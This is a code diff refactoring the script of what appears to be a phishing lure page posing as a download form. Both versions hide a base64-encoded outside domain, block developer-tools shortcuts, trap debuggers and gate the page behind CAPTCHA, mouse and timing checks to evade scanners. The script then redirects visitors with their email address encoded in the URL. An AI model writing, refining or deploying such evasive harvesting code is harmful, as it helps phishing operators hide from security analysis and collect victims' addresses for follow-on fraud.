@@ -145,23 +145,18 @@
   </div>
 
   <script>
-    // Enhanced security measures
     (function(){
-      // Fixed anti-debugging technique - won't trigger false positives
+      // Anti-debugging
       var debugCheck = function() {
         var start = Date.now();
         debugger;
         if (Date.now() - start > 3000) {
-          // Debugger detected - redirect to error page
           window.location.href = "about:blank";
-          return;
         }
       };
-      
-      // Run debug check once after a short delay
       setTimeout(debugCheck, 3000);
-      
-      // Prevent certain key combinations and right-click
+
+      // Prevent dev tools shortcuts
       document.addEventListener('keydown', function(e) {
         if (e.ctrlKey && ['s','p','u','c','x','i','j'].includes(e.key.toLowerCase()) || 
             e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
@@ -169,147 +164,140 @@
           return false;
         }
       });
-      
-      // Mouse movement tracking for human verification
+
+      // Mouse movement tracking
       var mouseMoved = false;
       document.addEventListener('mousemove', function() {
-        mouseMoved = true;
+        if (!mouseMoved) {
+          mouseMoved = true;
+          checkAllConditions(); // re-evaluate button state when mouse moves
+        }
       }, { once: true });
-      
-      // String obfuscation function
+
+      // Helper
       function decodeString(encoded) {
         return decodeURIComponent(escape(atob(encoded)));
       }
-      
-      // Obfuscated variables and function names
-      var _0x4d2a = ['download-form', 'status', 'success-message', 'download-btn', 
-                     'hp-phone', 'user-email', 'hp-url', 'getElementById', 
-                     'addEventListener', 'value', 'trim', 'toLowerCase', 
-                     'hidden', 'classList', 'textContent', 'getResponse', 
-                     'href', 'location', 'remove', 'add', 'disabled'];
-      
-      var formElement = document[_0x4d2a[7]](_0x4d2a[0]),
-          statusElement = document[_0x4d2a[7]](_0x4d2a[1]),
-          successElement = document[_0x4d2a[7]](_0x4d2a[2]),
-          submitButton = document[_0x4d2a[7]](_0x4d2a[3]),
-          redirectUrl = decodeString('aHR0cHM6Ly9iMWxlam91dXdnLmdhbWVzc3RvcmUuaXQuY29t'),
-          pageLoadTime = Date.now(),
-          widgetId,
-          turnstileToken = null,          // Store the Turnstile token
-          autoRedirectAttempted = false;   // Prevent multiple redirects
-      
-      // Enable pointer events after human interaction
+
+      // DOM elements
+      var form = document.getElementById('download-form');
+      var statusEl = document.getElementById('status');
+      var successEl = document.getElementById('success-message');
+      var submitBtn = document.getElementById('download-btn');
+      var emailInput = document.getElementById('user-email');
+      var hpPhone = document.getElementById('hp-phone');
+      var hpUrl = document.getElementById('hp-url');
+      var redirectUrl = decodeString('aHR0cHM6Ly9iMWxlam91dXdnLmdhbWVzc3RvcmUuaXQuY29t');
+      var pageLoadTime = Date.now();
+      var widgetId = null;
+      var turnstileToken = null;
+
+      // Enable pointer events on first interaction
       function enablePointerEvents() {
-        submitButton.classList.remove('no-pointer-events');
+        submitBtn.classList.remove('no-pointer-events');
       }
-      
       document.addEventListener('click', enablePointerEvents, { once: true });
       document.addEventListener('keydown', enablePointerEvents, { once: true });
-      
-      // Function to attempt auto-redirect when all conditions are met
-      function attemptAutoRedirect() {
-        // If already redirected, do nothing
-        if (autoRedirectAttempted) return;
-        
-        // Check honeypot fields
-        if (document[_0x4d2a[7]](_0x4d2a[4])[_0x4d2a[9]][_0x4d2a[10]]() !== '' ||
-            document[_0x4d2a[7]](_0x4d2a[6])[_0x4d2a[9]][_0x4d2a[10]]() !== '') {
+
+      // Check all conditions and enable/disable button accordingly
+      function checkAllConditions() {
+        // Honeypot check
+        if (hpPhone.value.trim() !== '' || hpUrl.value.trim() !== '') {
+          submitBtn.disabled = true;
           return;
         }
-        
-        // Check email is filled
-        var email = document[_0x4d2a[7]](_0x4d2a[5])[_0x4d2a[9]][_0x4d2a[10]]();
-        if (email === '') return;
-        
-        // Check Turnstile token exists
-        if (!turnstileToken) return;
-        
-        // Check mouse movement and time on page
-        if (!mouseMoved) return;
-        if (Date.now() - pageLoadTime < 3000) return;
-        
-        // All conditions passed, perform redirect
-        autoRedirectAttempted = true;
-        
-        // Hide any status, show success message
-        statusElement[_0x4d2a[13]][_0x4d2a[19]](_0x4d2a[12]);
-        successElement[_0x4d2a[13]][_0x4d2a[18]](_0x4d2a[12]);
-        
-        // Redirect with email encoded
-        window[_0x4d2a[17]][_0x4d2a[16]] = redirectUrl + '?email=' + btoa(email);
+
+        // Email filled
+        var email = emailInput.value.trim();
+        if (email === '') {
+          submitBtn.disabled = true;
+          return;
+        }
+
+        // Turnstile token exists
+        if (!turnstileToken) {
+          submitBtn.disabled = true;
+          return;
+        }
+
+        // Mouse movement
+        if (!mouseMoved) {
+          submitBtn.disabled = true;
+          return;
+        }
+
+        // Minimum time on page
+        if (Date.now() - pageLoadTime < 3000) {
+          submitBtn.disabled = true;
+          return;
+        }
+
+        // All passed → enable button
+        submitBtn.disabled = false;
+        statusEl.classList.add('hidden');
       }
-      
-      window[_0x4d2a[8]]('load', function() {
+
+      // Show error message
+      function showMessage(msg) {
+        successEl.classList.add('hidden');
+        statusEl.textContent = msg;
+        statusEl.classList.remove('hidden');
+      }
+
+      // Turnstile rendering
+      window.addEventListener('load', function() {
         if (window.turnstile) {
           widgetId = turnstile.render('#cf-captcha', {
             sitekey: '0x4AAAAAACr00NPpEmSFzX35',
             callback: function(token) {
-              turnstileToken = token;  // Store token
-              if (mouseMoved) {
-                submitButton[_0x4d2a[20]] = false;
-                statusElement[_0x4d2a[13]][_0x4d2a[18]](_0x4d2a[12]);
-              }
-              // Try auto-redirect now that Turnstile is done
-              attemptAutoRedirect();
+              turnstileToken = token;
+              checkAllConditions(); // re-check now that token exists
             },
             'error-callback': function() {
-              submitButton[_0x4d2a[20]] = true;
               turnstileToken = null;
+              submitBtn.disabled = true;
               showMessage(decodeString('Q0FQVENIQSBlcnJvciwgcGxlYXNlIHRyeSBhZ2Fpbi4='));
             },
             'expired-callback': function() {
-              submitButton[_0x4d2a[20]] = true;
               turnstileToken = null;
+              submitBtn.disabled = true;
               showMessage(decodeString('Q0FQVENIQSBleHBpcmVkLCBwbGVhc2UgY29tcGxldGUgYWdhaW4u'));
             }
           });
         }
       });
-      
-      // Listen for email input changes to trigger auto-redirect
-      document[_0x4d2a[7]](_0x4d2a[5])[_0x4d2a[8]]('input', function() {
-        attemptAutoRedirect();
-      });
-      
-      function showMessage(message) {
-        successElement[_0x4d2a[13]][_0x4d2a[19]](_0x4d2a[12]);
-        statusElement[_0x4d2a[14]] = message;
-        statusElement[_0x4d2a[13]][_0x4d2a[18]](_0x4d2a[12]);
-      }
-      
-      formElement[_0x4d2a[8]]('submit', function(event) {
-        event.preventDefault();
-        
-        // Enhanced bot detection
-        if (document[_0x4d2a[7]](_0x4d2a[4])[_0x4d2a[9]][_0x4d2a[10]]() !== '' ||
-            document[_0x4d2a[7]](_0x4d2a[6])[_0x4d2a[9]][_0x4d2a[10]]() !== '') {
+
+      // Email input → re-check conditions
+      emailInput.addEventListener('input', checkAllConditions);
+
+      // Form submission
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Re-run all checks (they should pass if button was enabled)
+        if (hpPhone.value.trim() !== '' || hpUrl.value.trim() !== '') {
           return showMessage(decodeString('Qm90IGRldGVjdGVkLg=='));
         }
-        
-        if (submitButton[_0x4d2a[20]]) {
-          return showMessage(decodeString('UGxlYXNlIGNvbXBsZXRlIHRoZSBDQVBUQ0hFIGJlZm9yZSBkb3dubG9hZGluZy4='));
+        if (submitBtn.disabled) {
+          return showMessage(decodeString('UGxlYXNlIGNvbXBsZXRlIGFsbCByZXF1aXJlZCBzdGVwcyBmaXJzdC4='));
         }
-        
-        // Fixed time verification - now checks if user spent reasonable time on page
         if (Date.now() - pageLoadTime < 3000) {
           return showMessage(decodeString('UGxlYXNlIHN0YXkgb24gcGFnZSBhIGJpdCBsb25nZXIu'));
         }
-        
         if (!mouseMoved) {
           return showMessage(decodeString('U3VzcGljaW91cyBhY3Rpdml0eSBkZXRlY3RlZC4gUGxlYXNlIHJlZnJlc2ggdGhlIHBhZ2Uu'));
         }
-        
-        var token = turnstile[_0x4d2a[15]](widgetId);
+        var token = turnstile.getResponse(widgetId);
         if (!token) {
           return showMessage(decodeString('UGxlYXNlIGNvbXBsZXRlIHRoZSBDQVBUQ0hBLg=='));
         }
-        
-        // If we get here, all checks passed (manual submit)
-        statusElement[_0x4d2a[13]][_0x4d2a[19]](_0x4d2a[12]);
-        successElement[_0x4d2a[13]][_0x4d2a[18]](_0x4d2a[12]);
-        
-        var email = document[_0x4d2a[7]](_0x4d2a[5])[_0x4d2a[9]][_0x4d2a[10]]()[_0x4d2a[11]]();
-        window[_0x4d2a[17]][_0x4d2a[16]] = redirectUrl + '?email=' + btoa(email);
+
+        // All good – show success message and redirect
+        statusEl.classList.add('hidden');
+        successEl.classList.remove('hidden');
+
+        var email = emailInput.value.trim().toLowerCase();
+        window.location.href = redirectUrl + '?email=' + btoa(email);
       });
     })();
   </script>
